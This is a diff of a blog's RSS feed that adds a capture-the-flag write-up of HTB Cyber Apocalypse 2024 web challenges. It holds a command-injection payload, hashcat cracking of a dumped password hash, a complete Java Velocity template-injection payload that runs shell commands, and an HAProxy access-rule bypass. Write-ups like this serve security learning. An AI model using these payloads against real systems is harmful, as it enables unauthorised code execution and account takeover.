@@ -6,7 +6,390 @@
         <description>Recent content in Posts on f0rk3b0mb</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 28 Feb 2024 22:44:28 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 11 Mar 2024 13:23:40 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>HTB_cyberapocalypse_2024</title>
+        <link>https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/</link>
+        <pubDate>Mon, 11 Mar 2024 13:23:40 +0300</pubDate>
+        
+        <guid>https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/</guid>
+        <description>&lt;img src="https://f0rk3b0mb.github.io/cover/ca2024.png" alt="Featured image of post HTB_cyberapocalypse_2024" /&gt;&lt;p&gt;This is the writeup of HTB cyber apocalypse 2024 web challenges.&lt;/p&gt;
+&lt;p&gt;I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.&lt;/p&gt;
+&lt;h3 id=&#34;web-category&#34;&gt;Web Category&lt;/h3&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;timekorp&#34;&gt;TimeKORP&lt;/h4&gt;
+&lt;p&gt;rating: very easy&lt;/p&gt;
+&lt;p&gt;Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&amp;lt;?php
+class TimeModel
+{
+    public function __construct($format)
+    {
+        $this-&amp;gt;command = &amp;#34;date &amp;#39;+&amp;#34; . $format . &amp;#34;&amp;#39; 2&amp;gt;&amp;amp;1&amp;#34;;
+    }
+
+    public function getTime()
+    {
+        $time = exec($this-&amp;gt;command);
+        $res  = isset($time) ? $time : &amp;#39;?&amp;#39;;
+        return $res;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This is classic command injection.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;payload :    %H:%M:%D&amp;#39;;cat flag.txt
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;flag: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/cmd.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;korp-terminal&#34;&gt;KORP terminal&lt;/h4&gt;
+&lt;p&gt;rating: very easy&lt;/p&gt;
+&lt;p&gt;For this challnge you are provided with a login page that requires a username and password. So it has to be login bypass.&lt;/p&gt;
+&lt;p&gt;Given the rating of this challenge just throw sqlmap at it. You can also confirm this by using a single quote ,it return a sql error.&lt;/p&gt;
+&lt;p&gt;Output from slqmap&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/sqlmap.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;sqlmap&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From this we get a user admin and the password hash.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;admin: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;hashcat -m 3200 hashcat.txt /usr/share/wordlists/rockyou.txt
+
+$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Cracking the password using hashcat we get the password : password123&lt;/p&gt;
+&lt;p&gt;We can then login to get the flag&lt;/p&gt;
+&lt;p&gt;flag: HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/login.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;flag-command&#34;&gt;Flag command&lt;/h4&gt;
+&lt;p&gt;rating: very easy&lt;/p&gt;
+&lt;p&gt;Here we are given an applicating that requires a bunch of commands to navigate a puzzle. When you intercept the traffic using burp you will see an endpoint with a  list of the commands.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/options.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Here we can see a secret command. Using it&amp;hellip;&lt;/p&gt;
+&lt;p&gt;flag: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/flag_command.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;labrinth-linguist&#34;&gt;Labrinth Linguist&lt;/h4&gt;
+&lt;p&gt;rating: easy&lt;/p&gt;
+&lt;p&gt;Here we are given a webapp that translates text that we give it.&lt;/p&gt;
+&lt;p&gt;Oooooh its a java application. I wasnt expecting thsi to be straight forward. But &amp;hellip;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;String template = &amp;#34;&amp;#34;;
+
+        try {
+            template = readFileToString(&amp;#34;/app/src/main/resources/templates/index.html&amp;#34;, textString);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Our input was being used in a template. This is dangerous if no filters are applied. I quickly googled SSTI in java (Server Side Template Injection) payloads. Got this &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://iwconnect.com/apache-velocity-server-side-template-injection/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt; .&lt;/p&gt;
+&lt;p&gt;From here we can execute commands and cat the flag. Credits to Anshul for doing this. I had a problem using the payload in burp suite due to the newlines.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;#set($s=&amp;#34;&amp;#34;)
+            #set($stringClass=$s.getClass())
+            #set($stringBuilderClass=$stringClass.forName(&amp;#34;java.lang.StringBuilder&amp;#34;))
+            #set($inputStreamClass=$stringClass.forName(&amp;#34;java.io.InputStream&amp;#34;))
+            #set($readerClass=$stringClass.forName(&amp;#34;java.io.Reader&amp;#34;))
+            #set($inputStreamReaderClass=$stringClass.forName(&amp;#34;java.io.InputStreamReader&amp;#34;))
+            #set($bufferedReaderClass=$stringClass.forName(&amp;#34;java.io.BufferedReader&amp;#34;))
+            #set($collectorsClass=$stringClass.forName(&amp;#34;java.util.stream.Collectors&amp;#34;))
+            #set($systemClass=$stringClass.forName(&amp;#34;java.lang.System&amp;#34;))
+            #set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
+            #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
+            #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
+
+            #set($runtime=$stringClass.forName(&amp;#34;java.lang.Runtime&amp;#34;).getRuntime())
+            #set($process=$runtime.exec(&amp;#34;cat ../flag2023911480.txt&amp;#34;))
+            #set($null=$process.waitFor() )
+
+            #set($inputStream=$process.getInputStream())
+            #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
+            #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
+            #set($stringBuilder=$stringBuilderConstructor.newInstance())
+
+            #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
+
+            $output
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Just use the payload in the browser and capture the request in burp.&lt;/p&gt;
+&lt;p&gt;flag : HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/ssti.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;locktalk&#34;&gt;Locktalk&lt;/h4&gt;
+&lt;p&gt;rating: medium&lt;/p&gt;
+&lt;p&gt;This is where things got interesting.&lt;/p&gt;
+&lt;p&gt;Here you are given a webapplication with an api blueprint.&lt;/p&gt;
+&lt;p&gt;The api had three routes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;/flag   protected by middleware
+
+/chat/&amp;lt;int:chat_id&amp;gt;  protected by middleware
+
+/get_ticket  open but blocked by ha proxy
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;A quick look at the proxy configuration&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;frontend haproxy
+    bind 0.0.0.0:1337
+    default_backend backend
+
+    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;So we had to find a way to bypass this. I used a lot of time on this part. Until i found this &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://www.haproxy.com/blog/december-2023-cve-2023-45539-haproxy-accepts-as-part-of-the-uri-component-fixed#:~:text=HAProxy%20before%202.8.,png%20to%20a%20static%20server.&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;To make your search easier you had to find the ha proxy version from the dockerfile : PS i had forgotten do thsi , it could have made my work easier.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;WORKDIR /tmp
+RUN wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.1.tar.gz &amp;amp;&amp;amp; \
+    tar zxvf haproxy-*.tar.gz &amp;amp;&amp;amp; cd haproxy-* &amp;amp;&amp;amp; \
+    make TARGET=linux-musl &amp;amp;&amp;amp; \
+    make install
+RUN rm -rf *
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;From the article if we make a request to /api/v1/get_ticket we get denied but if we make request to /api/v1/get_ticket# we bypass the acl.&lt;/p&gt;
+&lt;p&gt;From here i gotr the jwt token. I tries common methos of exploiting jwt but none of them worked. UNtil i searched for a vulnerability in python_jwt==3.3.3 from the requirements.txt&lt;/p&gt;
+&lt;p&gt;I found this vulnerability that enables us to bypass the jwt verification &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/advisories/GHSA-5p8v-58qm-c7fp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt; and for the exploit &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/user0x1337/CVE-2022-39227&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/ha.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;exp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We change our role to administrator and then read the flag&lt;/p&gt;
+&lt;p&gt;flag: HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/ca2024/pyjwt.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;testimonial&#34;&gt;Testimonial&lt;/h4&gt;
+&lt;p&gt;Here we are given a webapplication that accepts parameters customer and testimonial.&lt;/p&gt;
+&lt;p&gt;It is a go webapplication witha  grpc endpoint. I saw some people asking on the discord why there were two ip addresses. One if for the main webapp  and one was for grpc. Read more about grpc &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://google.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Ive encountered with grpc before. So the tools we will need are grpcurl and grpcui. In this context grpcui will not work.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;grpcurl  -plaintext  -import-path ./  -proto ptypes.proto -d &amp;#39;{&amp;#34;customer&amp;#34;: &amp;#34;examplecusomer&amp;#34;, &amp;#34;testimonial&amp;#34;: &amp;#34;exampletestimonial&amp;#34;}&amp;#39; 94.237.59.119:45387 RickyService.SubmitTestimonial
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Above is the format for grpcurl. Breakdown:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;ptypes.proto file is in the pb folder . This is used to enable grpcurl to interact with the server since service enumaration was disables . This is what caused grpcui not to work.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The service and method name can be found in the source code.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Using this will also enable you to bypass the filter that was placed in the code&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;for _, char := range []string{&amp;#34;/&amp;#34;, &amp;#34;\\&amp;#34;, &amp;#34;:&amp;#34;, &amp;#34;*&amp;#34;, &amp;#34;?&amp;#34;, &amp;#34;\&amp;#34;&amp;#34;, &amp;#34;&amp;lt;&amp;#34;, &amp;#34;&amp;gt;&amp;#34;, &amp;#34;|&amp;#34;, &amp;#34;.&amp;#34;} {
+		customer = strings.ReplaceAll(customer, char, &amp;#34;&amp;#34;)
+	}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;NOTE: Beyond this point i did after the ctf , i did not solve this one.&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Htb_monitored</title>
         <link>https://f0rk3b0mb.github.io/p/htb_monitored/</link>
         <pubDate>Wed, 28 Feb 2024 22:44:28 +0300</pubDate>
